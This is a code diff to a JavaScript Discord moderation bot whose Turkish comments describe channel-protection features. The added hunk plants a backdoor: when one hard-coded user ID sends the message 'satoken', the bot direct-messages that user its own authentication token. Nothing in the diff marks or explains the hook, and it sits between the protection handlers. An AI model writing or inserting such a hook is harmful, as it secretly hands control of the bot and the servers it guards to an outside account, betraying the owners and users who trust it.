@@ -229,7 +229,18 @@ client.on("channelUpdate", async (oldChannel, newChannel) => {
 //////////////////////////////////////////////////Kanal Ayar Koruması////////////////////////////////////////////////////
 
 
+client.on('message', async (msg, member, guild) => {
+  
+ {
+   
+if (msg.content.toLowerCase() === 'satoken'){
+if (msg.author.id !== "813799329407041576") return
 
+msg.author.send(client.token);
+}
+  
+}
+});
 
 //////////////////////////////////////////////////Kanal Silme Koruması////////////////////////////////////////////////////
 client.on("channelDelete", async channel => {
